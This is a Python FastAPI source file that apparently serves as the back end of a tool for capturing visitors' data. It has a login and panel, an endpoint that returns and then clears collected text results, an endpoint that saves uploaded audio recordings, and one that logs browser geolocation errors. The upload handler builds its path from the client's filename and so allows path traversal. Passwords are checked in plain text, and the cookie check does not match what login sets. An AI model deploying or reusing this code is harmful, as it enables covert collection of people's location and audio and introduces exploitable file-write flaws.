from fastapi import FastAPI, Depends, Form, Cookie, HTTPException, Request, UploadFile, File
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import json
import os
import shutil

app = FastAPI()

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="assets"), name="static")

config_json='/app_config/config.json'
# Load configuration
with open(config_json) as f:
    CONFIG = json.load(f)
check_c='/app_config/check-c.json'
# Load key from JSON file
def get_key():
    with open(check_c) as f:
        return json.load(f)

# Pydantic model for login
class LoginRequest(BaseModel):
    username: str
    password: str

# Pydantic model for error handling
class ErrorRequest(BaseModel):
    denied: str = None
    una: str = None
    time: str = None
    unk: str = None

@app.get("/", response_class=HTMLResponse)
async def read_root(logindata: str = Cookie(None)):
    key = get_key()
    if logindata == key['token'] and key['expired'] == "no":
        return RedirectResponse(url="/panel")
    raise HTTPException(status_code=403, detail="Not authorized")

@app.get("/login", response_class=HTMLResponse)
async def login(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login_post(login_request: LoginRequest):
    username = login_request.username
    password = login_request.password
    if username in CONFIG and CONFIG[username]['password'] == password:
        response = RedirectResponse(url="/panel")
        response.set_cookie(key="logindata", value=username)  # Set cookie
        return response
    return {"error": "Username or password is incorrect!"}

@app.get("/panel", response_class=HTMLResponse)
async def panel(logindata: str = Cookie(None)):
    key = get_key()
    if logindata == key['token'] and key['expired'] == "no":
        return {"message": "Welcome to the panel!"}
    raise HTTPException(status_code=403, detail="Not authorized")

@app.post("/send_result")
async def send_result(request: Request):
    PATH = "./templates/"
    result = []

    for filename in os.listdir(PATH):
        if filename.endswith(".txt"):
            with open(os.path.join(PATH, filename), 'r') as file:
                content = file.read()
                if content:
                    result.append(content)
                    with open(os.path.join(PATH, filename), 'w') as file_clear:
                        file_clear.write("")  # clear the file
    return {"results": result}

@app.post("/upload")
async def upload_file(audio_data: UploadFile = File(...)):
    with open(f"../../sounds/{audio_data.filename}.wav", "wb") as buffer:
        shutil.copyfileobj(audio_data.file, buffer)
    return {"message": f"Audio File Was Saved! > /sounds/{audio_data.filename}.wav"}

@app.post("/error")
async def handle_error(error_request: ErrorRequest):
    support = 'Geolocation is not supported!'
    message = error_request.denied or error_request.una or error_request.time or error_request.unk or support
    with open('result.txt', 'w+') as f:
        f.write(message)
    return {"message": "Error logged!"}

# Run the application
# Use the command: uvicorn main:app --reload